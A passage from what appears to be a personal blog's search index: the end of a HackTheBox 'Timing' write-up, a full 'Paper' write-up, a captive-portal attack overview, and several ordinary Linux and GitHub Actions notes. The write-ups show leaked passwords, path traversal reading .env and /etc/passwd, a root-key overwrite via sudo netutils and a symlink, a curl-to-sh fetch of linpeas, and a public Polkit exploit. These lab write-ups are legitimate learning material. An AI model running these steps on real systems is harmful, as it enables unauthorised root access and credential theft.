/home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/login.php[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/logout.php[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/profile.php[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/profile_update.php[+] Found file: /home/kali/Downloads/backup/./0-16de2698b5b122c93461298eab730d00273bd83e/upload.php[+] Found commit: e4e214696159a25c69812571c8214d2bf8736a3f[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/admin_auth_check.php[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/auth_check.php[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/avatar_uploader.php[+] Found folder: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/css[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/css/bootstrap.min.css[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/css/login.css[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/db_conn.php[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/footer.php[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/header.php[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/image.php[+] Found folder: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/images[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/images/background.jpg[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/images/user-icon.png[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/index.php[+] Found folder: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/js[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/js/avatar_uploader.js[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/js/bootstrap.min.js[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/js/jquery.min.js[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/js/profile.js[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/login.php[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/logout.php[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/profile.php[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/profile_update.php[+] Found file: /home/kali/Downloads/backup/./1-e4e214696159a25c69812571c8214d2bf8736a3f/upload.phpUSER FLAG- Privilege Escalation [User]A new password found by ssh aaron with this password we get access:‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Downloads/backup]‚îî‚îÄ$ cat 0-16de2698b5b122c93461298eab730d00273bd83e/db_conn.php &amp;&amp; cat 1-e4e214696159a25c69812571c8214d2bf8736a3f/db_conn.php &lt;?php$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');&lt;?php$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');aaron@timing:~$ cat user.txtaaa6...7b06ROOT FLAG- Privilege Escalation [Root]I found we can run netutils as root also it exits inside /root/ folder so we can‚Äôt view that.aaron@timing:~$ sudo -lMatching Defaults entries for aaron on timing:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser aaron may run the following commands on timing:    (ALL) NOPASSWD: /usr/bin/netutilsaaron@timing:~$ sudo /usr/bin/netutilsnetutils v0.1Select one option:[0] FTP[1] HTTP[2] QuitInput &gt;&gt; 1Enter Url: http://10.10.11.135/image.php?img=images/background.jpgInitializing download: http://10.10.11.135/image.php?img=images/background.jpgFile size: unavailableOpening output file image.phpServer unsupported, starting from scratch with one connection.Starting download[ N/A]  .......... .......... .......... .......... ..........  [ 543.9KB/s][ N/A]  .......... .......... .......... .......... ..........  [1039.6KB/s][ N/A]  .......... .......... .......... .......... ..........  [1522.1KB/s][ N/A]  .......... .......... .......... .......... ..........  [1980.6KB/s][ N/A]  ...Connection 0 finishedDownloaded 203.4 Kilobyte in 0 seconds. (1980.56 KB/s)aaron@timing:~$ ls -litotal 20821220 -rw-r--r-- 1 root root  208312 Apr  8 15:41 image.php59940 -rw-r----- 1 root aaron     33 Apr  8 04:58 user.txtand it‚Äôs download files in aaron home with root permission.with create a symlink of /root/.ssh/authorized_keys with keys so when we get the file with same name it‚Äôs overwrite the content of authorized_keys.aaron@timing:~$ ln -s /root/.ssh/authorized_keys keys‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Downloads/backup]‚îî‚îÄ$ cd  /home/kali/.ssh/                                                                                                                                           ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/.ssh]‚îî‚îÄ$ python3 -m http.server 80                 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...‚îÄ‚îÄ(kali„âøkali)-[~/.ssh]‚îî‚îÄ$ ssh -i id_rsa root@10.10.11.135Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Fri Apr  8 15:55:42 UTC 2022  System load:  0.04              Processes:           181  Usage of /:   52.0% of 4.85GB   Users logged in:     1  Memory usage: 22%               IP address for eth0: 10.10.11.135  Swap usage:   0%8 updates can be applied immediately.8 of these updates are standard security updates.To see these additional updates run: apt list --upgradableFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsroot@timing:~# root@timing:~# cat root.txt f6ab...1af0with checking the Hi there üëã Support me!  Life is an echo‚Äîwhat you send out comes back."
  },
  
  {
    "title": "HTB Paper Writeup",
    "url": "/posts/Paper/",
    "categories": "HackTheBox, Writeup, Easy",
    "tags": "Writeup, HTB-Easy",
    "date": "2022-03-11 17:00:00 +0100",
    





    
    "snippet": "INFOMachine IP = 10.10.11.143OS       = LinuxLevel    = EasyPoints   = 20SCANNING- Nmap:# Nmap 7.92 scan initiated Sun Mar 13 11:10:47 2022 as: nmap -sV -sC -oA /home/kali/Desktop/nmap/Paper 10.10....",
    "content": "INFOMachine IP = 10.10.11.143OS       = LinuxLevel    = EasyPoints   = 20SCANNING- Nmap:# Nmap 7.92 scan initiated Sun Mar 13 11:10:47 2022 as: nmap -sV -sC -oA /home/kali/Desktop/nmap/Paper 10.10.11.143Nmap scan report for 10.10.11.143Host is up (0.28s latency).Not shown: 997 closed tcp ports (reset)PORT    STATE SERVICE  VERSION22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)| ssh-hostkey: |   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)| http-methods: |_  Potentially risky methods: TRACE|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28|_http-title: HTTP Server Test Page powered by CentOS|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)|_ssl-date: TLS randomness does not represent time|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28|_http-title: HTTP Server Test Page powered by CentOS| http-methods: |_  Potentially risky methods: TRACE| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US| Subject Alternative Name: DNS:localhost.localdomain| Not valid before: 2021-07-03T08:52:34|_Not valid after:  2022-07-08T10:32:34| tls-alpn: |_  http/1.1Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Mar 13 11:11:22 2022 -- 1 IP address (1 host up) scanned in 34.86 secondsENUMERATION- Ports:PORT      STATE    SERVICE       VERSION22/tcp    open     ssh           OpenSSH 8.0 (protocol 2.0)80/tcp    open     http          Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)443/tcp   open     ssl/http      Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)With port 80 we have only a simple static page.- Gobuster:gobuster dir -u http://10.10.11.143 -w /usr/share/wordlists/dirb/big.txt -x php,txt,html,js -t 80 -o gobuster.logAfter Gobuster No! usefull information.By check the certificate over https site on port 443 we got nothing.With checking the responce of headers with the port 80 we found a vhost [office.paper] let‚Äôs add this to /etc/hosts file.echo \"10.10.11.143    office.paper\" &gt;&gt; /etc/hostsHere with our new VHost office.paper by checking footer, theme, and Wappalyzer [a browser extension] we can confirm there‚Äôs a WordPress hosted with version 5.2.3 which is vulnerable for Unauthenticated View Private/Draft Posts.And there‚Äôs a one comment which tell michael to remove the secret content in drafts ASAP.But for reaching this drafts we need admin creads that we don‚Äôt have it yet.For that we just need to add ?static=1 after the url.http://office.paper/?static=1The results we get a new secret that tell us about new vhost and registration url. let‚Äôs add the vhost in /etc/hosts file.sudo nano /etc/hosts10.10.11.143    office.paper chat.office.paperGo to new VHost then registration url we get the registration form let‚Äôs register ourself.After login then click on general room.In the chat there is recyclops bot that helps the user to list the sales directory with list command and with file command we can view the content inside the file.I used the list and file command to get the content inside directory.the list command list the directory of current path let‚Äôs try directory Path Traversal using ../And we get the previous directory content. hubot directory looks interesting let‚Äôs check the content in that.Got a .env file. .ENV file usually use to store secrets.let‚Äôs check the content in that using file ../hubot/.envAnd we got the username [recyclops] and password[Queenofblad3s!23].Let‚Äôs back and check the user available in this machine using file ../../../etc/passwdand we found [dwight] have access to [/bin/bash]USER FLAG- Privilege Escalation [User]So let‚Äôs do ssh with preview password and user dwightAnd we got the user.txt[dwight@paper ~]$ cat user.txt ROOT FLAGlet‚Äôs run linPEAS.curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | shAnd we see this machine is vulnerable to CVE-2021-3560 that is Polkit or Pwnkit which allows unprivileged user to call privileged methods using DBus.- Privilege Escalation [Root]Let‚Äôs get this python script inside this machine and run this.https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py$ chmod +x CVE-2021-3560.py $ python3 CVE-2021-3560.py maybe you need to run it multi times.then we get the root.txt file.[root@paper]# cat root.txt  Hi there üëã Support me!  Life is an echo‚Äîwhat you send out comes back."
  },
  
  {
    "title": "RPI Zero W E: You don't have enough free space in /var/cache/apt/archives/. [Solved]",
    "url": "/posts/note-rpi-space-issue/",
    "categories": "Linux",
    "tags": "Note, Troubleshooting, Linux",
    "date": "2021-08-28 00:00:00 +0200",
    





    
    "snippet": "RPI Zero W E: You don‚Äôt have enough free space in /var/cache/apt/archives/. [Solved]This error message showed up on a raspberry pi zero-w with a fresh install of Raspbian or others OS-related.Error...",
    "content": "RPI Zero W E: You don‚Äôt have enough free space in /var/cache/apt/archives/. [Solved]This error message showed up on a raspberry pi zero-w with a fresh install of Raspbian or others OS-related.Error Msg.You don't have enough free space in /var/cache/apt/archives/.Solution by the command lineraspi-config --expand-rootfs Hi there üëã Support me!  Life is an echo‚Äîwhat you send out comes back."
  },
  
  {
    "title": "Error[Solved]: GitHub 'merge.tool' is not configured",
    "url": "/posts/note-github-merg-tool-is-not-congfigured/",
    "categories": "DevOps",
    "tags": "DevOps, Troubleshooting, Linux, GitHub",
    "date": "2021-06-19 00:00:00 +0200",
    





    
    "snippet": "Error[Solved]: GitHub ‚Äòmerge.tool‚Äô is not configuredThis message is displayed because ‚Äòmerge.tool‚Äô is not configured.Error Msg.See 'git mergetool --tool-help' or 'git help config' for more details....",
    "content": "Error[Solved]: GitHub ‚Äòmerge.tool‚Äô is not configuredThis message is displayed because ‚Äòmerge.tool‚Äô is not configured.Error Msg.See 'git mergetool --tool-help' or 'git help config' for more details.'git mergetool' will now attempt to use one of the following tools:meld opendiff kdiff3 tkdiff xxdiff tortoisemerge gvimdiff diffuse diffmerge ecmerge p4merge araxis bc codecompare smerge emerge vimdiffSolutionReplace :git mergetoolWith:git mergetool --tool=vimdiff Hi there üëã Support me!  Life is an echo‚Äîwhat you send out comes back."
  },
  
  {
    "title": " GitHub actions run bash script and push to another repository",
    "url": "/posts/github-actions-run-bash-script/",
    "categories": "DevOps",
    "tags": "DevOps, Script, Note, GitHub",
    "date": "2021-05-15 00:00:00 +0200",
    





    
    "snippet": "GitHub actions run bash script and push to another repositoryToday I going to share with you the idea of how to do automation to run a script for reporting or monitoring your system, cloud, etc‚Ä¶And...",
    "content": "GitHub actions run bash script and push to another repositoryToday I going to share with you the idea of how to do automation to run a script for reporting or monitoring your system, cloud, etc‚Ä¶And I going to use cron job to schedule the task as I used here [cron: ‚Äò0 0 * * *‚Äô] to run our script every day at midnight.I have here two repositories as below shown:https://github.com/iven86/test01 &lt;- Private repo, Where my own scripts there.https://github.com/iven86/test02 &lt;- Public repo, Where I want to share the results and it's could be private too.At first, You have to create a new token key and add it at secrets under the name API_TOKEN_GITHUB. Then we are going to move to the next step.Create actions:Go to your actions tab and on workflows create two as below:A - main.ymlname: Push commiton:  push:  schedule:        - cron: '0 0 * * *' # run every day at midd nightjobs:  report:    runs-on: ubuntu-latest    steps:    - uses: actions/checkout@v2    - name: Run script file      run: |         chmod +x ./build.sh         ./build.sh      shell: bash    - name: Commit report      run: |        git config --global user.name '&lt;Your GitHub user&gt;'        git config --global user.email '&lt;Your GitHub email&gt;'        git commit -am \"&lt;Your commit MSG's&gt;\"        git pushB - push.ymlname: Push Fileon:  push:  schedule:        - cron: '10 0 * * *' # run every day at midd nightjobs:  copy-file:    runs-on: ubuntu-latest    steps:    - name: Checkout      uses: actions/checkout@v2    - name: Pushes test file      uses: &lt;Your GitHub user&gt;/test01@master      env:        API_TOKEN_GITHUB: $      with:        source_file: 'FireFi.txt'        destination_repo: '&lt;Your GitHub user&gt;/test02'        destination_folder: '&lt;Your next destination folder on the next repository&gt;'        user-email: '&lt;Your GitHub email&gt;'        user_name: '&lt;Your GitHub user&gt;'        commit_message: '&lt;Your commit MSG's&gt;'Create an action.yml file inside your repository:name: 'Push a file to another repository'description: 'Used for pushing a copy of a file to another repository'inputs:  source_file:    description: 'Source file from the origin directory'    required: true  destination_repo:    description: 'Destination repository'    required: true  destination_folder:    description: 'Directory to push the file to'    required: false  user_email:    description: 'Email for the git commit'    required: true  user_name:    description: 'GitHub username for the commit'    required: true  destination_branch:    description: 'branch to push file to, defaults to master'    required: false  destination_branch_create:    description: 'Destination branch to create for this commit'    required: false  commit_message:    description: 'A custom message for the commmit'    required: falseruns:  using: 'docker'  image: 'Dockerfile'  args:    - $    - $    - $    - $    - $    - $    - $branding:  icon: 'git-commit'  color: 'green'Create a Dockerfile inside your repository:FROM alpineRUN apk update &amp;&amp; \\    apk upgrade &amp;&amp; \\    apk add gitCOPY entrypoint.sh /entrypoint.shRUN chmod +x /entrypoint.shENTRYPOINT [ \"/entrypoint.sh\" ]Create an entry point script (entrypoint.sh) inside your repository:#!/bin/shset -eset -xif [ -z \"$INPUT_SOURCE_FILE\" ]then  echo \"Source file must be defined\"  return -1fiif [ -z \"$INPUT_DESTINATION_BRANCH\" ]then  INPUT_DESTINATION_BRANCH=masterfiOUTPUT_BRANCH=\"$INPUT_DESTINATION_BRANCH\"CLONE_DIR=$(mktemp -d)echo \"Cloning destination git repository\"git config --global user.email \"$INPUT_USER_EMAIL\"git config --global user.name \"$INPUT_USER_NAME\"git clone --single-branch --branch $INPUT_DESTINATION_BRANCH \"https://x-access-token:$API_TOKEN_GITHUB@github.com/$INPUT_DESTINATION_REPO.git\" \"$CLONE_DIR\"echo \"Copying contents to git repo\"mkdir -p $CLONE_DIR/$INPUT_DESTINATION_FOLDERcp -R \"$INPUT_SOURCE_FILE\" \"$CLONE_DIR/$INPUT_DESTINATION_FOLDER\"cd \"$CLONE_DIR\"if [ ! -z \"$INPUT_DESTINATION_BRANCH_CREATE\" ]then  git checkout -b \"$INPUT_DESTINATION_BRANCH_CREATE\"  OUTPUT_BRANCH=\"$INPUT_DESTINATION_BRANCH_CREATE\"fiif [ -z \"$INPUT_COMMIT_MESSAGE\" ]then  INPUT_COMMIT_MESSAGE=\"Update from https://github.com/${GITHUB_REPOSITORY}/commit/${GITHUB_SHA}\"fiecho \"Adding git commit\"git add .if git status | grep -q \"Changes to be committed\"then  git commit --message \"$INPUT_COMMIT_MESSAGE\"  echo \"Pushing git commit\"  git push -u origin HEAD:$OUTPUT_BRANCHelse  echo \"No changes detected\"fiAt the end create your own script under the name (build.sh) or you can change it whatever you want.That‚Äôs it, Hope this short article help youSources:https://github.com/marketplace/actions/push-directory-to-another-repository Hi there üëã Support me!  Life is an echo‚Äîwhat you send out comes back."
  },
  
  {
    "title": " Captive portal attack!",
    "url": "/posts/captive-portal-attack/",
    "categories": "Cyber Security",
    "tags": "Cyber Security",
    "date": "2021-05-12 00:00:00 +0200",
    





    
    "snippet": "Captive portal attack!A captive portal is a web page accessed with a web browser that is displayed to newly connected users of a Wi-Fi or wired network before they are granted broader access to net...",
    "content": "Captive portal attack!A captive portal is a web page accessed with a web browser that is displayed to newly connected users of a Wi-Fi or wired network before they are granted broader access to network resources. Captive portals are commonly used to present a landing or log-in page which may require authentication, payment, acceptance of an end-user license agreement, acceptable use policy, survey completion, or other valid credentials that both the host and user agree to adhere by. Captive portals are used for a broad range of mobile and pedestrian broadband services ‚Äì including cable and commercially provided Wi-Fi and home hotspots. A captive portal can also be used to provide access to enterprise or residential wired networks, such as apartment houses, hotel rooms, and business centers.source: wikipediaThere is more than one way to implement a captive portal, like:  HTTP redirect  ICMP redirect  Redirect by DNSThe attacking side works perfectly if we act MITM and running a script that receives all request from the Captive portal and connection check to reply to these request to force to open page this page will do:  hijacks all Internet traffic from the machine.  installs a persistent web-based backdoor in HTTP cache for hundreds of thousands of domains and common Javascript CDN URLs, all with access to the user‚Äôs cookies via cache poisoning.  allows the attacker to remotely force the user to make HTTP requests and proxy back responses (GET &amp; POSTs) with the user‚Äôs cookies on any backdoored domain.  does not require the machine to be unlocked.  backdoors and remote access persist even after MITM stoped.The affected list of the operating systems with this attack:  Windows  macOS  iPhone  android  Linux  AP router itself too.On the defense side you have to:  Stop using public wifi.  always use VPN  disable Captive portalThe above steps help you to stay 50% safe from this kind of attacks Hi there üëã Support me!  Life is an echo‚Äîwhat you send out comes back."
  },
  
  {
    "title": "Replace a string in multiple files in Linux command line",
    "url": "/posts/replace-a-string-in-multiple-files-in-linux-command-line/",
    "categories": "Linux",
    "tags": "DevOps, Note, Linux",
    "date": "2020-12-02 00:00:00 +0100",
    





    
    "snippet": "Replace a string in multiple files in Linux command lineWhen working with text files, you‚Äôll often need to find and replace strings of text in one or more files.So let‚Äôs bind some commands like:The...",
    "content": "Replace a string in multiple files in Linux command lineWhen working with text files, you‚Äôll often need to find and replace strings of text in one or more files.So let‚Äôs bind some commands like:The Linux grep command is a string and pattern matching utility that displays matching lines from multiple files. It also works with the piped output from other commands.The grep command is famous in Linux and Unix circles for three reasons. Firstly, it is tremendously useful. Secondly, the wealth of options can be overwhelming. Thirdly, it was written overnight to satisfy a particular need.grep -RiIl ‚Äòsearch‚ÄôQuick grep explanation:    -R - recursive search    -i - case-insensitive    -I - skip binary files (you want to text, right?)    -l - print a simple list as output. Needed for the other commandssed is a stream editor. It can perform basic text manipulation on files and input streams such as pipelines. With sed, you can search, find and replace, insert, and delete words and lines. It supports basic and extended regular expressions that allow you to match complex patterns.sed -i 's/SEARCH_REGEX/REPLACEMENT/g' INPUTFILEQuick sed explanation:  -i - By default, sed writes its output to the standard output. This option tells sed to edit files in place. If an extension is supplied (ex -i.bak), a backup of the original file is created.  s - The substitute command, probably the most used command in sed./ / / - Delimiter character. It can be any character but usually the slash (/) character is used.  SEARCH_REGEX - Normal string or a regular expression to search for.  REPLACEMENT - The replacement string.  g - Global replacement flag. By default, sed reads the file line by line and changes only the first occurrence of the SEARCH_REGEX on a line. When the replacement flag is provided, all occurrences are replaced.INPUTFILE - The name of the file on which you want to run the command.Need to string some Linux commands together, but one of them doesn‚Äôt accept piped input? xargs can take the output from one command and send it to another command as parameters.the full code of replacing a string in multiple files in Linux command linegrep -RiIl 'research' | xargs sed -i 's/RESEARCH/REPLACEMENT/g' Hi there üëã Support me!  Life is an echo‚Äîwhat you send out comes back."
  },
  
  {
    "title": "Auto send collaborators invitation to GitHub repos after they pay or donate",
    "url": "/posts/auto-send-collaborators-invitation-to-github-repos-after-they-pay-or-donate/",
    "categories": "DevOps",
    "tags": "DevOps, Python3, GitHub API",
    "date": "2020-07-02 18:00:00 +0200",
    





    
    "snippet": "Auto send collaborators invitation to GitHub repos after they pay or donateIn this article, I going on how to use Google forms to collect donations, support, or sponsor your project even you can us...",
    "content": "Auto send collaborators invitation to GitHub repos after they pay or donateIn this article, I going on how to use Google forms to collect donations, support, or sponsor your project even you can use it for charity to auto-send postcards, letters after their donation to thank them.So I‚Äôm here going to use Google form to collect information or forward to payout page with PayPal, Why Google Form? to reduce the cost of hosting our payment page with hosting providers and saving the money.The main points we‚Äôll go through it during this article:  Google Forms and Sheets  Python3 Automation script  GitHub actionsGoogle Forms and SheetsSure everyone knows about Google forms or has at lees used it many times in your work but today we go a little bit deep with it by using add-ons like (Payable Forms) to add it go to three doted next to send button and choose add-onsThen write down in search box Payable forms and install itWhen you have done with installation go to this screen to connect with your PayPal account also you can use the sample fields and then modify them as you like.Don‚Äôt forget to collect the donor or supporter GitHub account for the next step.Python3 Automation scriptHere‚Äôs my favorite part, We didn‚Äôt talk much in the preview part you know it‚Äôs easy, We have not spent more time with it but just focus on how to collect the right information for our Python script to deal with it.So in our main.py file, we have to import the below modules and walk through this list of modules:from google.auth.transport.requests import Requestfrom google.oauth2.credentials import Credentialsfrom google_auth_oauthlib.flow import InstalledAppFlowfrom googleapiclient.discovery import buildfrom googleapiclient.errors import HttpErrorModule: google.auth.transport.RequestRequests request adapter.This class is used internally for making requests using various transports in a consistent way. If you use AuthorizedSession you do not need to construct or use this class directly.This class can be useful if you want to manually refresh a Credentials instance:import google.auth.transport.requestsimport requestsrequest = google.auth.transport.requests.Request()credentials.refresh(request)Module: google.oauth2.credentialsOAuth 2.0 Credentials.This module provides credentials based on OAuth 2.0 access and refreshes tokens. These credentials usually access resources on behalf of a user (resource owner).Specifically, this is intended to use access tokens acquired using the Authorization Code grant and can refresh those tokens using a optional refresh token.Obtaining the initial access and refresh token is outside of the scope of this module. Consult rfc6749 section 4.1 for complete details on the Authorization Code grant flow.Module: google_auth_oauthlib.flowThis module provides integration with requests-oauthlib for running the OAuth 2.0 Authorization Flow and acquiring user credentials.Module: googleapiclient.discoveryYou can use the Google APIs Discovery Service for building a variety of different tools to use with Google APIs. However, the primary purpose of the Discovery document is to allow Google to create client libraries in various programming languages. This section describes how you could go about building a custom client library for Google APIs.Source: Google Auth Library for Python and Google API Docscheck out this samplehttps://developers.google.com/docs/api/quickstart/pythonAuthorization credentialsAuthorization credentials for a desktop application. To learn how to create credentials for a desktop application, refer to Create credentialshttps://developers.google.com/workspace/guides/create-credentialsFor the above modules, we going to create this function, and let‚Äôs name it as gsheet_auth()def gsheet_auth():    creds = None    # The file token.json stores the user's access and refresh tokens, and is    # created automatically when the authorization flow completes for the first    # time.    if os.path.exists('token.json'):        creds = Credentials.from_authorized_user_file('token.json', SCOPES)    # If there are no (valid) credentials available, let the user log in.    if not creds or not creds.valid:        if creds and creds.expired and creds.refresh_token:            creds.refresh(Request())        else:            flow = InstalledAppFlow.from_client_secrets_file(                'mycredentials.json', SCOPES)            creds = flow.run_local_server(port=0)        # Save the credentials for the next run        with open('token.json', 'w') as token:            token.write(creds.to_json())    return credsFor this moment we have a connection with Google Sheet API all that we have to do to query all records with this functiondef gsheet_query(ndays, mode):    mode = int(mode)    ndays = int(ndays)    creds = gsheet_auth()    try:        service = build('sheets', 'v4', credentials=creds)        # Call the Sheets API        sheet = service.spreadsheets()        result = sheet.values().get(spreadsheetId=SAMPLE_SPREADSHEET_ID, range=SAMPLE_RANGE_NAME).execute()        df = pd.DataFrame.from_dict(result['values'])        df.columns = df.iloc[0]        df.drop(df.index[0], inplace=True)        start_date = (datetime.today() - timedelta(days=ndays)).strftime('%m/%d/%Y %H:%M:%S')  # \"12/25/2021 00:00:00\"        end_date = datetime.today().strftime('%m/%d/%Y %H:%M:%S')  # \"12/26/2021 00:00:00\"        after_start_date = df[\"Payable Last Updated\"] &gt;= start_date        before_end_date = df[\"Payable Last Updated\"] &lt;= end_date        between_two_dates = after_start_date &amp; before_end_date        filtered_dates = df.loc[between_two_dates]Here‚Äôs the final part of the Python script which is a function to do auto-send collaborators invitations to your GitHub repos for this part we going to communicate with GitHub API############################### GitHub API ######################################def github_collaborator_add(COLLABORATOR_USER_NAME, REPO_NAME):    ######################################    # To add collaborator to your repos ##    ######################################    headers = {        'Authorization': f'Bearer {GITHUB_TOKEN}'    }    collaborators_url = f\"https://api.github.com/repos/{GITHUB_USER}/{REPO_NAME}/collaborators/{COLLABORATOR_USER_NAME}\"    payload = {\"permission\": \"admin\"}    srs = requests.request('PUT', collaborators_url, headers=headers, json=payload) # Comment this line if you want to check the link with the values and uncomment the next line    # srs = collaborators_url     return srsOr you can change this part to send a Postcard or lettersGitHub actionsFor this part, we going to run our script Automatically in schedule trigger with Github workflowworkflowCreate this directory (.github/workflows/) and then create (main.yml) paste the below script in itBe sure (.gethub/) started with dotename: \"Auto GitHub Collaborators Invite\"on:  schedule:        - cron: '0 0 * * *' # run every day at midd night - GMT  issues:      types: [opened]jobs:    minesweeper:        runs-on: ubuntu-latest        steps:                # Setup Python first        - name: Setup Python          uses: actions/setup-python@v2.2.1          with:            python-version: 3.8.10            - name: Clone repos          run: |            git clone https://iven86:${{ secrets.GH_TOKEN }}@github.com/iven86/auto_github_collaborators_invite                    # Install require libs        - name: Install required libraries          run: |            pip install -r auto_github_collaborators_invite/requirements.txt                    - name: Run Python Script          env:            SPREADSHEET_ID: ${{ secrets.SPREADSHEET_ID }}            RANGE_NAME: ${{ secrets.RANGE_NAME }}            GH_TOKEN: ${{ secrets.GH_TOKEN }}            GH_USER: ${{ secrets.GH_USER }}            GH_ORG_NAME: ${{ secrets.GH_ORG_NAME }}            GH_TEAM: ${{ secrets.GH_TEAM }}                      run: |            SPREADSHEET_ID=$SPREADSHEET_ID RANGE_NAME=$RANGE_NAME GH_TOKEN=$GH_TOKEN GH_USER=$GH_USER GH_ORG_NAME=$GH_ORG_NAME GH_TEAM=$GH_TEAM python3 auto_github_collaborators_invite/main.py -m 3 -d 1                      - name: Push Updated Token To The Main Repo          run : |            cd auto_github_collaborators_invite            git remote set-url origin https://iven86:${{ secrets.GH_TOKEN }}@github.com/iven86/auto_github_collaborators_invite            git config --global user.email \"ivenprvb@gmail.com\"            git config --global user.name \"iven86\"            git add .            git commit -m \"Update the token file\"            git push -f origin mainFor full source code follow this link and support me!.https://forms.gle/gSv3mDMyJh3cty8B8For another sample about GitHub actions, read my past articlehttps://iven.in/devops/github-actions-run-bash-script/ Hi there üëã Support me!  Life is an echo‚Äîwhat you send out comes back."
  },
  
  {
    "title": "Remove Unnecessary Configuration Files On Linux (Debian-based Systems)",
    "url": "/posts/remove-unnecessary-configuration-files-on-linux/",
    "categories": "Linux",
    "tags": "Troubleshooting, Linux",
    "date": "2020-07-02 18:00:00 +0200",
    





    
    "snippet": "Remove Unnecessary Configuration Files On Linux (Debian-based Systems)There is a  difference between ‚Äì  apt remove vs apt purge vs apt autoremove vs apt clean vs apt autoclean. These are the comman...",
    "content": "Remove Unnecessary Configuration Files On Linux (Debian-based Systems)There is a  difference between ‚Äì  apt remove vs apt purge vs apt autoremove vs apt clean vs apt autoclean. These are the commands that we use to remove the packages, config files of removed packages and clean the local cache in any Debian-based systems.  apt remove ‚Äì This command is used to remove a package but leave all of its configuration files in place. When you reinstall the same package later, all of your settings will still be intact.  apt purge ‚Äì It is the same as ‚Äúapt remove‚Äù command but also removes all of the configuration files.  apt autoremove ‚Äì It removes any packages on your Deb-based system that are no longer required. Those packages are called unused packages. So, the ‚Äúautoremove‚Äù command simply removes packages that hasn‚Äôt been installed manually by the user and that‚Äôs not needed by any other package in your system.  apt clean ‚Äì When you use apt to install or update something from the repositories, it first downloads all the required packages to your local drive and then installs them. The ‚Äúapt-get clean‚Äù command removes those downloaded packages. It doesn‚Äôt uninstall any package, it just cleans that cache.  apt autoclean ‚Äì Like ‚Äúapt clean‚Äù, the ‚Äúapt autoclean‚Äù command clears out the local repository of retrieved package files. The difference is that it removes all stored archives in your cache for packages that can not be downloaded anymore.Find all packages that are removed but not purged in Debian, UbuntuFirst, let us list the leftover files in the system using dpkg command:$ dpkg -l | grep ^rcOr,$ dpkg -l | grep \"^rc\"This command will list all packages that have been removed but not purged.You can also use the following apt command to list all packages that are removed but not purged:$ apt list | grep 'residual-config'Another way to list the 